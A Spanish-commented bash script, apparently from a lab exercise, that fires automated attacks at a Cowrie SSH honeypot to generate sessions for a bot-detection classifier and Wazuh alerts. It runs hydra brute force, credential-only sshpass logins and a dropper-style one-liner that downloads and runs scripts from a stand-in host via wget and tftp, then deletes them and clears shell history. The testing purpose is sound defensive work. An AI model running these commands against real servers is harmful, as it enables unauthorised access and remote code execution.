#!/usr/bin/env bash
#
# Ataques AUTOMATIZADOS contra el honeypot Cowrie de la víctima (puerto 2222).
# Genera sesiones que el clasificador debe etiquetar como AUTOMATED.
#
# Requiere: hydra, sshpass   (apt install hydra sshpass)
# Uso:      bash auto_attack.sh <IP_VICTIMA>
#
set -euo pipefail
TARGET="${1:?Uso: auto_attack.sh <IP_VICTIMA>}"
PORT=2222
USER=root
PASS=lab123

echo "==> 1) Fuerza bruta automatizada (hydra) contra $TARGET:$PORT"
# diccionario corto de ejemplo; hydra martillea credenciales a ritmo de máquina
printf '123456\nadmin\nroot\ntoor\npassword\nlab123\n' > /tmp/passwords.txt
hydra -l "$USER" -P /tmp/passwords.txt -t 4 -f \
      ssh://"$TARGET":"$PORT" || true

echo "==> 2) Sesión automatizada tipo 'dropper' (comandos a ritmo de máquina)"
# secuencia ejecutada de un tirón, sin pausas humanas -> AUTOMATED
sshpass -p "$PASS" ssh -p "$PORT" -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null "$USER@$TARGET" \
        'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; \
         wget http://203.0.113.10/bins.sh; chmod 777 bins.sh; sh bins.sh; \
         tftp 203.0.113.10 -c get t.sh; chmod 777 t.sh; sh t.sh; \
         rm -rf bins.sh t.sh; history -c' || true

echo "==> 3) Escáner que solo prueba credenciales (sin comandos)"
for p in 0000 1111 guest test; do
  sshpass -p "$p" ssh -p "$PORT" -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 \
          "$USER@$TARGET" exit 2>/dev/null || true
done

echo ""
echo "LISTO. Revisa los veredictos en la víctima:"
echo "  tail -f /var/log/ssh-classifier/verdicts.json"
echo "y las alertas en el dashboard de Wazuh (regla 100101 = AUTOMATED)."
